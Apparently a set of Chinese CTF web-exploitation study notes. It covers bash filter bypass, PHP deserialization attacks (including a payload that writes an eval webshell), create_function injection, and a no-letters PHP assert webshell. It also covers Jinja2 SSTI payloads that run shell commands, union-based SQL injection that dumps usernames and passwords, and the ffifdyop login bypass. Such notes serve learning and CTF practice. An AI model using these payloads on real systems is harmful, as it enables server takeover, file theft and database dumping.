![在这里插入图片描述](https://img-blog.csdnimg.cn/2020110815501055.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70#pic_center)

##### 0x20 $PATH环境变量绕过

第一种，可以使用大写字母数字和{}

可以使用环境变量来绕过，`$PATH`环境变量截取字母

![img](https://img-blog.csdnimg.cn/20210523104428889.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523104442182.png)

第二种，可以使用大写字母和{}

我们先来看看ls怎么构造，在上一个方法中，ls为`${PATH:5:1}${PATH:11:1}`，但是数字被过滤了，我们可以用环境变量的长度来代替数字，例如我们最熟悉的$PATH的长度为88
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523142705276.png)

那么找到环境变量长度值为5和11的就可以构造ls了，我们用如下脚本来寻找长度为5和11的环境变量。注：最后grep 5就是找长度为5的变量

```bash
for i in `env`; do echo -n "${i%=*} lenth is ";echo ${i#*=}|awk '{print length($0)}'; done |grep 5
1
```

这里找到了三个，我们随便用一个，比如$TERM环境变量
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523143028251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70)
同理，我找到了`SHLVL`环境变量的长度为1，`LANG`的长度为11，成功构造出了l
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523143321798.png)

最后ls构造如下

```bash
${PATH:${#TERM}:${#SHLVL}}${PATH:${#LANG}:${#SHLVL}}
1
```

成功执行ls命令
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523143508983.png)

但是我这里的环境变量和题目环境的不一样所以执行失败，因为题解的payload为，`${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}}`构造出来是nl，但是我这里为ll
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210523144155688.png)
换个环境再试试吧







![在这里插入图片描述](https://img-blog.csdnimg.cn/20200801105037221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70)





#### （六）反序列化漏洞

##### 1.什么是序列化和反序列化

序列化是将对象转换为字符串以便存储传输的一种方式。而反序列化恰好就是序列化的逆过程,反序列化会将字符串转换为对象供程序使用。在PHP中序列化和反序列化对应的函数分别为serialize()和unserialize()。
##### 2.什么是反序列化漏洞

当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。
##### 3.序列化函数（serialize）

当我们在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，用于保存对象的值方便之后的传递与使用。

测试代码

```php
<?php 
 class Stu{
    public $name = 'aa';
    public $age = 18;
    public function demo(){
        echo "你好啊";
    }
$stu = new Stu();
echo "<pre>";
print_r($stu);
//进行序列化
$stus = serialize($stu);
print_r($stus);
}
 
?>
```

查看结果：

##### 4.反序列化(unserialize)

        unserialize()可以从序列化后的结果中恢复对象（object）为了使用这个对象，在下列代码中用unserialize重建对象.

测试代码：

```php
<?php 
	//定义一个Stu类
	class Stu
	{	
		//定义成员属性
		public $name = 'aa';
		public $age = 19;
		//定义成员方法
		public function demo()
		{
			echo '你吃了吗';
		}
	}
	//实例化对象
	$stu = new Stu();
	//进行序列化
	$stus = serialize($stu);
	print_r($stus);
	echo "<br><pre>";
	//进行反序列化
	print_r(unserialize($stus));
 ?>
```


##### 5.PHP魔术方法

魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。

```php
1、__get、__set

这两个方法是为在类和他们的父类中没有声明的属性而设计的

__get( $property ) 当调用一个未定义的属性时访问此方法

__set( $property, $value ) 给一个未定义的属性赋值时调用

这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）

2、__isset、__unset

__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法

__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法

与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）

3、__call

__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法

4、__autoload

__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。

注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。

5、__construct、__destruct

__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称

__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法

默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.

在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。

6、__clone

PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。

7、__toString

__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。

在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）

从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。

8、__sleep、__wakeup

__sleep 串行化的时候用

__wakeup 反串行化的时候调用

serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。

使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。

相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。

9、__set_state

当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ => value, …)格式排列的类属性。

10、__invoke

当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效

11、__callStatic

它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。

同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。
```

##### 6.魔术方法的利用

测试代码：

```php
<?php
  class Stu
    {
       public $name = 'aa';
       public $age = 18;
       
      function __construct()
      {
        echo '对象被创建了__consrtuct()';
      }
      function __wakeup()
      {
        echo '执行了反序列化__wakeup()';
      }     
       function __toString()
      {
        echo '对象被当做字符串输出__toString';
        return 'asdsadsad';
      }
      function __sleep()
      {
        echo '执行了序列化__sleep';
        return array('name','age');
      }
      function __destruct()
      {
        echo '对象被销毁了__destruct()';
      }
 
    } 
    $stu =  new Stu();
    echo "<pre>";
   //序列化
    $stu_ser = serialize($stu);
    print_r($stu_ser);
    //当成字符串输出
    echo "$stu";
   //反序列化
    $stu_unser = unserialize($stu_ser);
    print_r($stu_unser);
?>
```

##### 7.反序列化漏洞的利用

由于反序列化时unserialize()函数会自动调用wakeup(),destruct(),函数，当有一些漏洞或者恶意代码在这些函数中，当我们控制序列化的字符串时会去触发他们，从而达到攻击。
1.__destruct()函数

个网站内正常页面使用logfile.php文件，代码中使用unserialize()进行了反序列化，且反序列化的值是用户输入可控 。正常重构Stu对象

测试代码：

```php
<?php 
	header("content-type:text/html;charset=utf-8");
	//引用了logfile.php文件
	include './logfile.php';
	//定义一个类
	class Stu
	{
		public $name = 'aa';
		public $age = 19;
		function StuData()
		{
			echo '姓名:'.$this->name.'<br>';
			echo '年龄:'.$this->age;
		}
	}
	//实例化对象
	$stu = new Stu();
	//重构用户输入的数据
	$newstu = unserialize($_GET['stu']);
	//O:3:"Stu":2:{s:4:"name";s:25:"<script>alert(1)</script>";s:3:"age";i:120;}
	echo "<pre>";
	var_dump($newstu) ;
 ?>
```

logfile.php 代码：

```php
<?php 
	class LogFile
	{
		//日志文件名
		public $filename = 'error.log';
		//存储日志文件
		function LogData($text)
		{
			//输出需要存储的内容
			echo 'log some data:'.$text.'<br>';
			file_put_contents($this->filename, $text,FILE_APPEND);
		}
		//删除日志文件
		function __destruct()
		{
			//输出删除的文件
			echo '析构函数__destruct 删除新建文件'.$this->filename;
			//绝对路径删除文件
			unlink(dirname(__FILE__).'/'.$this->filename);
		}
	} 
 ?>
```

正常输入参数：O:3:"Stu":2:{s:4:"name";s:2:"aa";s:3:"age";i:20;}

重构logfile.php文件包含的对象进行文件删除 

     正常重构：O:7:"LogFile":1:{s:8:"filename";s:9:"error.log";}

 发现正常删除，但如果我们修改参数，让其删除其他的文件呢？

    异常重构：O:7:"LogFile":1:{s:8:"filename";s:10:"../ljh.php";}
    执行该代码

2.__wakeup()

例如有一个代码为index.php，源码如下

```php
<?php 
	class chybeta
	{
		public $test = '123';
		function __wakeup()
		{
			$fp = fopen("shell.php","w") ;
			fwrite($fp,$this->test);
			fclose($fp);
		}
	}
	$class = @$_GET['test'];
	print_r($class);
	echo "</br>";
	$class_unser = unserialize($class);
	
	// 为显示效果，把这个shell.php包含进来
    require "shell.php";
 ?>
```

 传入参数：?test=O:7:"chybeta":1:{s:4:"test";s:19:"<?php phpinfo(); ?>";}

 查看shell.php文件

也可以传入一句话木马：O:7:"chybeta":1:{s:4:"test";s:25:"<?php eval($_POST[1]); ?>";}
3.toString()

举个例子，某用户类定义了一个__toString为了让应用程序能够将类作为一个字符串输出(echo $obj)，而且其他类也可能定义了一个类允许 __toString读取某个文件。把下面这段代码保存为fileread.php

fileread.php代码

```php
<?php 
	//读取文件类
	class FileRead
	{
		public $filename = 'error.log';
		function __toString()
		{
			return file_get_contents($this->filename);
		}
	}
 ?>
```

 个网站内正常页面应引用fileread.php文件，代码中使用unserialize()进行了反序列化，且反序列化的值是用户输入可控 。

测试代码：

```php
<?php 
	//引用fileread.php文件
	include './fileread.php';
	//定义用户类
	class User
	{
		public $name = 'aa';
		public $age = 18;
		function __toString()
		{
			return '姓名:'.$this->name.';'.'年龄:'.$this->age;
		}
	}
	//O:4:"User":2:{s:4:"name";s:2:"aa";s:3:"age";i:18;}
	//反序列化
	$obj = unserialize($_GET['user']);
	//当成字符串输出触发toString
	echo $obj;
 ?>
```

 正常重构：O:4:"User":2:{s:4:"name";s:2:"aa";s:3:"age";i:18;}

 

重构fileread.php文件包含的类进行读取password.txt文件内容

重构：O:8:"FileRead":1:{s:8:"filename";s:12:"password.txt";}
九反序列化漏洞的防御

##### <font color="red">[!重要] 8.原生类利用</font>

当存在反序列化但是没有可以利用的类时，我们一般通过原生类进行构造，原生类是php直接继承的类，可以直接创建对象。

-**DirectoryIterator类**

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。


DirectoryIterator 类会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名：

例如：

```php
<?php
$dir=new DirectoryIterator("/");
echo $dir;
```


这个查不出来什么，如果想输出全部的文件名我们还需要对$dir对象进行遍历：

```php
<?php
$dir=new DirectoryIterator("/");
foreach($dir as $tmp){
    echo($tmp.'\<br>');
    //echo($tmp->toString().'\<br>); //与上句效果一样
}
```

代码里两个语句一样,这也印证了之前说的echo触发了Directorylterator 中的toString()方法 。

我们也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：

```php
<?php
$dir=new DirectoryIterator("glob:///*php*");
echo $dir;
```


 也可以通过目录穿越，确定我们已知的文件的具体路径：

```php
<?php
$dir=new DirectoryIterator("glob://./././flag.txt");  //目录穿越
echo $dir;
```

-**FilesystemIterator 类**
FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。

该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)

```php
<?php
$dir=new FilesystemIterator("/");
echo $dir;
```

```php
<?php
$dir=new FilesystemIterator("/");
foreach($dir as $tmp){
    echo($tmp.'<br>');
    //echo($f->__toString().'<br>');
}
```

 小发现：经 php_study 测试发现，如果123.php文件在D://phpstudy_Pro/WWW/ 下。我们可用于确定路径的文件也必须在其中，如D:// 或 D://phpstudy_Pro 或 D://php_study_Pro/WWW 。

-**GlobIterator 类**
GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()函数，可以通过模式匹配来寻找文件路径。使用这个类不需要额外写上glob://

还有：

Directorylterator类 与 FilesystemIterator 类当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。**也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的**。而GlobIterator 类在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如：例题里我们知道了flag的文件名特征为 以f开头的.txt文件，因此我们可以通过 GlobIterator类来模式匹配：

```php
<?php
$dir=new GlobIterator("f*txt");
echo $dir;
```


###### 可读取文件类

-**SplFileObject 类**
SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等

```php
<?php
$dir=new SplFileObject("/flag.txt");
echo $dir;
?> 
//但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：
```

```php
<?php
    $dir = new SplFileObject("/flag.txt");
    foreach($dir as $tmp){
        echo ($tmp.'<br>');
    }
?>
```


最后，形如：

```php
echo new $this->key($this->value);
```

```php
$this -> a = new $this->key($this->value);
echo $this->a;
```
没有pop链的思路和可利用反序列化的函数，一般就是需要用原生类了。

只需要让$this->key值赋为我们想用原生函数，$this->value赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的第一个文件。


#### （七）php写入文件

PHP 写入文件 - fwrite()

fwrite() 函数用于写入文件。

fwrite() 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。

下面的例子把姓名写入名为 "newfile.txt" 的新文件中：

实例

```php
<?php
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$txt = "Bill Gates\n";
fwrite($myfile, $txt);
$txt = "Steve Jobs\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
```

请注意，我们向文件 "newfile.txt" 写了两次。在每次我们向文件写入时，在我们发送的字符串 $txt 中，第一次包含 "Bill Gates"，第二次包含 "Steve Jobs"。在写入完成后，我们使用 fclose() 函数来关闭文件。

如果我们打开 "newfile.txt" 文件，它应该是这样的：

```
Bill Gates
Steve Jobs
```

PHP 覆盖（Overwriting）

如果现在 "newfile.txt" 包含了一些数据，我们可以展示在写入已有文件时发生的的事情。所有已存在的数据会被擦除并以一个新文件开始。

在下面的例子中，我们打开一个已存在的文件 "newfile.txt"，并向其中写入了一些新数据：

实例

```php
<?php
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
$txt = "Mickey Mouse\n";
fwrite($myfile, $txt);
$txt = "Minnie Mouse\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
```

如果现在我们打开这个 "newfile.txt" 文件，Bill 和 Steve 都已消失，只剩下我们刚写入的数据：

```
Mickey Mouse
Minnie Mouse
```

#### （八）create_function()注入

create_function(string args,string code);
这是一个创建匿名函数的方法，args是形参列表，code是代码
如

```php
$s = create_function("$a","each $a;");
```

相当于
function ($a){
	echo $a;
}
由于是匿名函数，它没有名称；
我们可以通过传入code来闭合函数，如

```php
$s = create_function("$a",$_GET['ss']);
```

我们?ss=}phpinfo();//
就可以实现
function ($a){
	
}
phpinfo();//

<?php
error_reporting(0);
include "flag.php";
// ‮⁦NISACTF⁩⁦Welcome to
if ("jitanglailo" == $_GET[ahahahaha] &‮⁦+!!⁩⁦& "‮⁦ Flag!⁩⁦N1SACTF" == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) { //tnnd! weishenme b
    echo $FLAG;
}
show_source(__FILE__);
?>

#### （九）unicode不显示

unicode特殊字符不会在源码中显示，如果发现传入的参数看着和网页上显示的一样，先复制下来粘贴到vscode查看unicode字符

#### （十）无数字字母文件上传

```php

//测试发现7.0.12以上版本不可使用
//使用时需要url编码下
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后post传入   _=phpinfo();
```

```
%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b'!'%3d%3d'%40'%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d'_'%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b
```

### 三、SSTI注入

服务端模板注入（Server-side template injection）是指攻击者能够利用模板自身语法将恶意负载注入模板，然后在服务端执行。

模板引擎被设计成通过结合固定模板和可变数据来生成网页。当用户输入直接拼接到模板中，而不是作为数据传入时，可能会发生服务端模板注入攻击。<u>这使得攻击者能够注入任意模板指令来操纵模板引擎，从而能够完全控制服务器。</u>顾名思义，服务端模板注入有效负载是在服务端交付和执行的，这可能使它们比典型的客户端模板注入更危险。

<u>render_template()是渲染文件的</u>

<u>render_template_string()是渲染字符串的</u>

<u>不正确的使用render_template_string()可能会引发SSTI</u>

引发SSIT的根本原因是**render_template**渲染函数的问题。

出现render_template的框架一般有：Flask（python3）、jinja2（python）、smarty（PHP）、Twig（PHP）、Freemarker（JavaEE）、velocity（JavaEE）；

所以当我们遇见smarty的时候，优先选择php注入

遇见flask/jinja2时优先选择python注入

![image-20220723234731635](E:\lamaper\Olympics_of_Information\image-20220723234731635.png)

**为什么需要服务器模板？**

简单来说，页面上的数据需要不断更新，即为渲染。后台语言通过一些模板引擎生成HTML的过程。（常见的模板渲染引擎Jade, YAML ）

因为Web Application 最终是要落实到HTML、CSS、JavaScript等用户界面上的，有一种情况是，每一个页面都需要特殊的逻辑，随着应用功能的增加，而且彼此之间没有同步，比如你改了站点的布局风格，那么随之就要修改成百上千的HTML文件。谁能忍？

既然如此多的HTML具有一定的逻辑联系，何不使用代码生成代码？于是后端模板语言诞生了。分别有前端渲染和后端（服务器）渲染，区别是：

    后端渲染是将一些模板规范语言翻译成如上三种语言回传给前端；而前端渲染则是将整个生成逻辑代码全部回传前端，再由客户端生成用户界面。
#### （一）探测

服务端模板注入漏洞常常不被注意到，这不是因为它们很复杂，而是因为它们只有在明确寻找它们的审计人员面前才真正明显。如果你能够检测到存在漏洞，则利用它将非常容易。在非沙盒环境中尤其如此。

与任何漏洞一样，利用漏洞的第一步就是先找到它。也许最简单的初始方法就是注入模板表达式中常用的一系列特殊字符，例如 ${{<%[%'"}}%\ ，去尝试模糊化模板。如果引发异常，则表明服务器可能以某种方式解释了注入的模板语法，从而表明服务端模板注入可能存在漏洞。

服务端模板注入漏洞发生在两个不同的上下文中，每个上下文都需要自己的检测方法。不管模糊化尝试的结果如何，也要尝试以下特定于上下文的方法。如果模糊化是不确定的，那么使用这些方法之一，漏洞可能会暴露出来。即使模糊化确实表明存在模板注入漏洞，你仍然需要确定其上下文才能利用它。

##### 纯文本上下文

大多数模板语言允许你通过直接使用 HTML tags 或模板语法自由地输入内容，后端在发送 HTTP 响应之前，会把这些内容渲染为 HTML 。例如，在 Freemarker 模板中，render('Hello ' + username) 可能会渲染为 Hello Carlos 。

这有时经常被误认为是一个简单的 XSS 漏洞并用于 XSS 攻击。但是，通过将数学运算设置为参数的值，我们可以测试其是否也是服务端模板注入攻击的潜在攻击点。

例如，考虑包含以下模板代码：

```json
render('Hello ' + username)
```

在审查过程中，我们可以通过请求以下 URL 来测试服务端模板注入：

```json
http://vulnerable-website.com/?username=${7*7}
```

如果结果输出包含 Hello 49 ，这表明数学运算被服务端执行了。这是服务端模板注入漏洞的一个很好的证明。

#### （二）常用工具

常用的过滤器（flask）

```python
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count
```

#### （三）常用技巧

##### [Smarty] 注入代码

在smarty中，低版本可以使用{php} {/php}标签执行php代码，新版本（3.1左右）不支持此标签，但仍然可以构造，{if phpinfo()}{/if}，在if标签中可以添加php代码。

##### [jinja2/flask] 注入代码

1.控制结构 {% %}

```jinja2
{% if user %}

Hello,{{user}} !

{% else %}

Hello,Stranger!

{% endif %}
```

2.变量取值 {{ }}

> jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。

3.注释 {# #}

由于jinja由python开，发python2与3差别较大，为了找到两个版本都通用的函数来进行注入，我们一般直接使用如下payload

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('tac /flag.txt').read()") }}{% endif %}{% endfor %}
```

第一句是为了获得子类，第二句为了获得找到了一个python2/3都有__builtins__的类 `_IterationGuard`的位置从而执行

或者直接从globals中寻找

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```



### 四、SQL注入

[SQL注入WIKI (radare.cn)](http://sqlwiki.radare.cn/)

[SQL注入(巨详解) - 美式加糖 - 博客园 (cnblogs.com)](https://www.cnblogs.com/peace-and-romance/p/15890387.html)

[sql注入详解_山山而川'的博客-CSDN博客_sql注入](https://blog.csdn.net/qq_44159028/article/details/114325805)

#### （一）常见的爆库操作

##### order by试出有几列

##### 暴露数据库名称

```
id = -1' union select 1,database,3 --+
```

##### 暴露表名称(查询该数据库下所有表)

```
id = -1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=<数据库名> --+
```

##### 暴露字段名(查询该表下所有字段)

```
id = -1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=<数据库名> and table_name=<表名> --+
id = -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'--+
```

##### 查数据

```
id=-1' union select 1,group_concat(username,0x5c,password),3 from security.users --+
id = -1' union select 1,2,group_concat(id,flag) from test_tb--+ 
id = -1' union select 1,2,group_concat(<字段1>,<字段2>) from <表>--+ 
```

##### 堆叠注入

#####   

##### 万用密码：ffifdyop

ffifdyop
经过md5加密后：276f722736c95d99e921722cf9ed621c
再转换为字符串：'or'6<乱码>  即  'or'66�]��!r,��b

用途：
select * from admin where password=''or'6<乱码>'
